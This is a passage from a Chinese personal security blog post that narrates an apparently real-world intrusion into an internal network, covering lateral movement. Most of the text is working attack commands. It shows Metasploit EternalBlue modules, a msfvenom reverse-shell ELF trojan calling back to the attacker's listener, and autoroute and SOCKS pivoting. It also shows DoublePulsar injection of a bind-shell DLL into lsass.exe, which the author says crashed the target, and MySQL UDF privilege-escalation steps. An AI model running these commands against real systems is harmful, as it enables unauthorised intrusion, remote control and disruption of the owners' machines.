<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line"></span><br><span class="line">目标出网时反向打：</span><br><span class="line">msf &gt; set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line"></span><br><span class="line">目标不出网时正向打（如添加了路由）：</span><br><span class="line">msf &gt; set payload windows/x64/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>

<p>但是同样没有shell弹回来。</p>
<p>==================分割线================================</p>
<p>后续我们采用这个脚本打，实战成功率高。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/projectboot/EternalPuls</span><br></pre></td></tr></table></figure>

<p>这里我们先给msf加一个路由,先把外网的weblinux主机弹一个会话到我们的kali上。</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=你的穿透 LPORT=你的穿透 -f elf &gt; shell.elf</code></p>
<p>将生成的木马传上去，然后kali开启监听。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.32.108</span><br><span class="line">set lport 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后执行木马（记得给执行权限），成功上线msf</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217233610003.png" alt="image-20230217233610003"></p>
<p>添加路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.1.70/24</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<p>开启流量代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">set srvhost 192.168.32.108</span><br><span class="line">set srvport 10011</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后在proxychains中配置好刚才的代理</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234742108.png" alt="image-20230217234742108"></p>
<p>攻击机上也做好代理，可以把原来的frp代理替换掉</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217234855406.png" alt="image-20230217234855406"></p>
<p>然后就可以用脚本开始打了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 目标IP --TargetPort 445</span><br><span class="line"></span><br><span class="line">Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 192.168.1.51 --TargetPort 445</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230217235008559.png" alt="image-20230217235008559"></p>
<p>64位，用msf生成64位的正向payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1125 -f dll -o bind.dll</span><br></pre></td></tr></table></figure>

<p>然后就可以用脚本直接打了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 目标ip --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload dll地址 --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</span><br></pre></td></tr></table></figure>

<p><code>Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.1.51 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload bind.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</code></p>
<p>kali再开一个挂代理的msf,正向连接我们注入的木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.1.51</span><br><span class="line">set lport 1125</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>（这里我应该是把51打蓝屏了，现在51探测不到了。）</p>
<h4 id="尝试2-1"><a href="#尝试2-1" class="headerlink" title="尝试2"></a>尝试2</h4><p>随后想到拿下了两个数据库，可以尝试udf</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172207850.png" alt="image-20230215172207850"></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172222517.png" alt="image-20230215172222517"></p>
<p>先查看了一下，mysql是有写入权限的。</p>
<p><code>show global variables like &#39;%secure%&#39;;</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172336987.png" alt="image-20230215172336987"></p>
<p><code>select version();</code>查看当前mysql版本</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215172723491.png" alt="image-20230215172723491"></p>
<p>版本大于5.1，udf.dll文件必须放在MySQL安装目录的lib\plugin文件夹下。（plugin文件夹默认不存在，需要创建）。</p>
<p><code>show variables like &#39;plugin%&#39;;</code>查看插件位置，有可能实际并不存在这个文件夹，但是会显示出来。所以我们并不知道是否存在这个目录，只能姑且尝试一下。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215173704248.png" alt="image-20230215173704248"></p>
<p>通过如下命令查看当前机器的系统架构</p>
<p><code>select @@version_compile_os, @@version_compile_machine;</code></p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215174039550.png" alt="image-20230215174039550"></p>
<p>很奇怪啊，fscan扫出来是win，而mysql查询出来却是linux。（本来想的是拿一台win的机器横向方便点。）</p>
<p>接下来我们去sqlmap内置里面找dll文件，路径如下:<code>sqlmap-master\data\udf\mysql</code></p>
<p>这台机器是linux64位，那我们就用64位的机器。</p>
<p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。这里如果后缀名不为.so_或dll_的话，就需要解码，如果后缀名为.so或.dll的话就不需要解码即可直接使用。这里sqlmap也自带了解码的py脚本，在<code>/extra/cloak</code>目录下，使用cloak.py解密即可。解密命令如下，</p>
<p><code>python cloak.py -d -i lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#x27;你的地址&#x27;)) into dumpfile &#x27;对面的地址&#x27;;</span><br><span class="line">#ps：这里windows下目录结构要进行转义双写</span><br></pre></td></tr></table></figure>

<p>但是有时候这一步的写入步骤只会写入一部分的内容，导致接下来的步骤都失败，所以也可以直接写入十六进制数据，详见：<a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p>
<p>执行，</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180547553.png" alt="image-20230215180547553"></p>
<p>可能目录不存在mysql写入的权限。经过下面使用ntfs的特性写入文件得知，文件夹确实是存在的。</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180027818.png" alt="image-20230215180027818"></p>
<p>而写入如下目录的文件却不可以写进去</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180703617.png" alt="image-20230215180703617"></p>
<p>也就是说，这个目录不存在mysql写入的权限。udf宣告失败。</p>
<p>但是可以往tmp写东西</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215180812102.png" alt="image-20230215180812102"></p>
<p>那么我们能不能尝试写入密钥（多半不可能，毕竟是root权限的目录）</p>
<p><img src="/2023/03/07/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91/image-20230215181730240.png" alt="image-20230215181730240"></p>
<p>好，还是不可能。另一台机器我也尝试过，无法写入。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实战内网的经验有些许不足，导致目标蓝屏，无法进一步扩展。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/03/03/c2%E6%9C%8D%E5%8A%A1%E5%99%A8CDN%E9%9A%90%E8%97%8F/" rel="prev" title="c2服务器CDN隐藏">
      <i class="fa fa-chevron-left"></i> c2服务器CDN隐藏
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/03/07/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%91%E7%BB%87%E6%A2%A6%E5%90%8E%E5%8F%B0rce-dedecms-v5-7-105/" rel="next" title="【漏洞分析】织梦后台rce <=dedecms v5.7.105">
      【漏洞分析】织梦后台rce <=dedecms v5.7.105 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E4%BB%8Erce%E5%88%B0%E4%B8%8A%E9%A9%AC%E5%88%B0%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%E5%88%B0%E5%86%85%E7%BD%91"><span class="nav-number">1.</span> <span class="nav-text">【实战】从rce到上马到脏牛提权到内网</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%96%E7%BD%91"><span class="nav-number">2.</span> <span class="nav-text">外网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%951"><span class="nav-number">2.3.</span> <span class="nav-text">尝试1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%952"><span class="nav-number">2.4.</span> <span class="nav-text">尝试2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%953%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="nav-number">2.5.</span> <span class="nav-text">尝试3（成功）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91"><span class="nav-number">3.</span> <span class="nav-text">内网</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.1.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.1.</span> <span class="nav-text">本机信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83"><span class="nav-number">3.1.2.</span> <span class="nav-text">脏牛提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.2.</span> <span class="nav-text">内网信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E4%BA%A7%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.2.1.</span> <span class="nav-text">资产探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="nav-number">3.2.2.</span> <span class="nav-text">内网代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">3.2.3.</span> <span class="nav-text">数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91"><span class="nav-number">3.2.4.</span> <span class="nav-text">横向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%9D%E8%AF%951-1"><span class="nav-number">3.2.4.1.</span> <span class="nav-text">尝试1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%9D%E8%AF%952-1"><span class="nav-number">3.2.4.2.</span> <span class="nav-text">尝试2</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="十三"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">十三</p>
  <div class="site-description" itemprop="description">潜心学习，不骄不躁</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">177</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">十三</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>
